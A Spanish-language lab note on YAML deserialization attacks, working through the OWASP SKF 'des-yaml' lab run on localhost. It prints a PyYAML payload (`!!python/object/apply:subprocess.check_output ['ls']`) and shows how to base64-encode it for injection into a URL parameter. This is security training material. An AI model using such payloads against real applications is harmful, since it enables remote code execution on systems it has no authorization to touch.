### Que es YAML?
YAML (YAML Ain't Markup Language) es un formato de serialización de datos legible por humanos, diseñado para ser fácil de leer y escribir. Se utiliza principalmente para archivos de configuración, DevOps (Ansible, Kubernetes, Docker) y serialización, siendo más limpio que JSON o XML al usar sangrías (espacios) en lugar de llaves.

> Un ataque de deserialización YAML ocurre cuando una aplicación **procesa datos YAML** maliciosos y no confiables, permitiendo a un atacante ejecutar código arbitrario o lograr una **Ejecución Remota de Código (RCE)**. Ocurre al cargar archivos YAML con funciones inseguras (como yaml.load en PyYAML o SnakeYAML sin restricciones) que reconstruyen objetos complejos, inyectando sintaxis maliciosa para alterar la lógica de la aplicación.


## Laboratorio
- [[skf-labs]] - des-yaml
	- `docker pull blabal1337/owasp-skf-lab:des-yaml`
	- `docker run -dit -p 127.0.0.1:5000:5000 blabal1337/owasp-skf-lab:des-yaml`

## Recurso web
- [Is is YAML?](https://www.pkmurphy.com.au/isityaml/)
## Ataque
- Primero que nada vemos en la url una cadena enorme que esta en base64, al decodificarla
```
echo -n "eWFtbDogVGhlIGluZm9ybWF0aW9uIHBhZ2UgaXMgc3RpbGwgdW5kZXIgY29uc3RydWN0aW9uLCB1cGRhdGVzIGNvbWluZyBzb29uIQ" | base64 -d
```
- Vemos lo siguiente: `yaml: The information page is still under construction, updates coming soon!`
- Esta decodificando esa parte de la url y poniendolo en la pagina, podemos intentar inyectar nosotros lo mismo
- Guardamos en un archivo `data`:
```
yaml: !!python/object/apply:subprocess.check_output ['ls']
```
- Y luego:
```
cat data | base64 -w 0; echo
```
- Seguimos la estructura del output inicial `yaml: algo` y utlizamos un comando malicioso